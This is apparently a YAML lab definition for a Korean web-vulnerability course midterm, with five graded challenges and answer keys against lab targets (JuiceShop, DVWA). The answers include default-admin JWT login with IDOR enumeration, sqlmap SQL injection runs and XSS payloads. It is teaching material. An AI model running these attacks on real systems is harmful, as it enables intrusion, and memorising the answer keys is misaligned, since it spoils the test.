@@ -1,0 +1,200 @@
+lab_id: standalone-web-vuln-week08
+title: 중간고사 — W01-W07 종합 (180분, 100점)
+version: standalone-non-ai
+course: web-vuln
+week: 8
+description: |
+  W01-W07 의 *종합 평가*. 5 챌린지 × 20점 (총 100점, 180분). PTES 의 *축약*
+  보고서 작성 + 7 vhost 의 *3 vuln* 발견 의무.
+difficulty: hard
+duration_minutes: 180
+prerequisites:
+  - W01-W07 모두 통과
+  - 학생 PC 의 curl + jq + python3 + sqlmap + openssl 가용
+pass_threshold: 0.6
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 챌린지 1 (20점) — A01 IDOR + JWT (JuiceShop)
+
+      JuiceShop 의 IDOR + JWT alg=none 시뮬 + 응답 매트릭스. W02 의 *재현*.
+
+      ## 평가 (각 4 점)
+      1. JuiceShop login + JWT 획득
+      2. JWT 의 3 segment decode
+      3. Bearer IDOR 5 user × no-auth 비교
+      4. alg=none 변조 + 결과
+      5. CWE-639 + CWE-345 매핑
+    hint: W02 lab 재현
+    category: exam
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      echo "token len: ${#TOK}"
+      for id in 1 2 3 4 5; do
+        echo "user $id: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" http://10.20.30.1/api/Users/$id)"
+      done
+      SH
+    answer_detail: A01 시험 응답
+    verify:
+      type: output_contains
+      expect: 'user 1: 200'
+      field: stdout
+      semantic:
+        intent: A01 시험
+        success_criteria: [JWT + IDOR + alg=none]
+        acceptable_methods: ["**[OSS] W02 lab 재현**"]
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 챌린지 2 (20점) — A02 Crypto (Hash + TLS)
+
+      JuiceShop password hash 식별 + TLS handshake 분석. W03 의 *재현*.
+
+      ## 평가
+      1. JuiceShop password hash 형식 식별
+      2. TLS 의 Protocol + Cipher
+      3. self-signed vs CA cert 인지
+      4. CVSS + CWE-327 매핑
+    hint: W03 의 hash + TLS
+    category: exam
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      echo | timeout 5 openssl s_client -connect 10.20.30.1:443 -servername juice.6v6.lab 2>&1 | grep -E 'Protocol|Cipher' | head -3
+      python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()).decode())" 2>&1 | head -2
+      SH
+    answer_detail: A02 시험 응답
+    verify:
+      type: output_contains
+      expect: 'Protocol\|Cipher'
+      field: stdout
+      semantic:
+        intent: A02 시험
+        success_criteria: [TLS + hash]
+        acceptable_methods: ["**[OSS] W03 lab 재현**"]
+    target_vm: attacker
+
+  - order: 3
+    instruction: |
+      ## 🎯 챌린지 3 (20점) — A03 SQLi (DVWA + sqlmap)
+
+      DVWA 의 SQLi + sqlmap baseline + tamper 우회. W04 의 *재현*.
+
+      ## 평가
+      1. sqlmap 4 phase 실행
+      2. ModSec 942 카운트 측정
+      3. 1 tamper script 우회 시도
+      4. CWE-89 매핑
+    hint: W04 의 sqlmap + tamper
+    category: exam
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      timeout 30 sqlmap -u "http://10.20.30.1/?id=1" --headers="Host: dvwa.6v6.lab" --batch --level=1 --risk=1 --threads=1 2>&1 | tail -10
+      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
+      echo "942 증가: $((AFTER - BEFORE))"
+      SH
+    answer_detail: A03 시험 응답
+    verify:
+      type: output_contains
+      expect: '942\|sqlmap'
+      field: stdout
+      semantic:
+        intent: A03 시험
+        success_criteria: [sqlmap + 942]
+        acceptable_methods: ["**[OSS] W04 lab 재현**"]
+    target_vm: attacker
+
+  - order: 4
+    instruction: |
+      ## 🎯 챌린지 4 (20점) — A03 XSS (JuiceShop) + A05 헤더
+
+      JuiceShop XSS 5 변형 + 7 vhost 보안 헤더 매트릭스. W05 + W07 의 *재현*.
+
+      ## 평가
+      1. XSS 5 변형 매트릭스
+      2. 941 카운트 측정
+      3. 7 vhost × 5 헤더 매트릭스
+      4. CWE-79 + CWE-16 매핑
+    hint: W05 + W07
+    category: exam
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      for p in '<script>alert(1)</script>' '<ScRiPt>' '<svg onload=alert(1)>'; do
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
+        echo "$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' "http://10.20.30.1/?q=$encoded") | $p"
+      done
+      for h in juice dvwa neobank; do
+        H=$(curl -sI -H "Host: $h.6v6.lab" http://10.20.30.1/ 2>&1)
+        echo "$h: XFO=$(echo "$H"|grep -ic x-frame) XCTO=$(echo "$H"|grep -ic x-content-type)"
+      done
+      SH
+    answer_detail: A03 XSS + A05 헤더 시험 응답
+    verify:
+      type: output_contains
+      expect: 'XFO\|403'
+      field: stdout
+      semantic:
+        intent: XSS + 헤더 시험
+        success_criteria: [XSS 매트릭스 + 헤더 매트릭스]
+        acceptable_methods: ["**[OSS] W05 + W07 lab 재현**"]
+    target_vm: attacker
+
+  - order: 5
+    instruction: |
+      ## 🎯 챌린지 5 (20점) — 중간고사 종합 보고서
+
+      W01-W07 의 *5 finding* 종합 보고서. PTES 4 섹션 + CVSS + CWE + ATT&CK.
+
+      ## 산출물
+
+      ```markdown
+      # 중간고사 종합 보고서 — 6v6 web-vuln
+
+      ## 1. Executive Summary (5+)
+      - 5 finding 발견
+      - critical 1 (alg=none) + high 2 + medium 2
+
+      ## 2. Findings (각 4 점)
+      F1 IDOR (W02) / F2 JWT alg=none (W02) / F3 SQLi baseline (W04) /
+      F4 XSS (W05) / F5 헤더 부족 (W07)
+
+      ## 3. Remediation
+      각 finding 의 *즉시 + 단기*
+
+      ## 4. 매핑 (CVSS + CWE + ATT&CK)
+      | F | CVSS | CWE | ATT&CK |
+      | F1 | 8.2 | CWE-639 | T1078 |
+      | F2 | 9.1 | CWE-345 | T1556 |
+      | F3 | 9.8 | CWE-89 | T1190 |
+      | F4 | 6.1 | CWE-79 | T1059.007 |
+      | F5 | 5.4 | CWE-16 | (config) |
+
+      ## 5. 본인 자기 평가
+      - W01-W07 의 *각* 1-5 점
+      - 본 시험 의 *어려운 영역* + *학습 필요*
+      - W09 이후 의 *준비도*
+      ```
+    hint: 5 finding 종합 + 매핑
+    category: synthesis
+    points: 20
+    answer: 위 5 섹션
+    answer_detail: 중간고사 종합 보고서
+    verify:
+      type: output_contains
+      expect: 'CWE-\|CVSS'
+      field: stdout
+      semantic:
+        intent: 중간 종합
+        success_criteria: [5 섹션 + 5 finding]
+        acceptable_methods: ["**[관리적] PTES + CVSS + CWE + ATT&CK**"]
+    target_vm: bastion
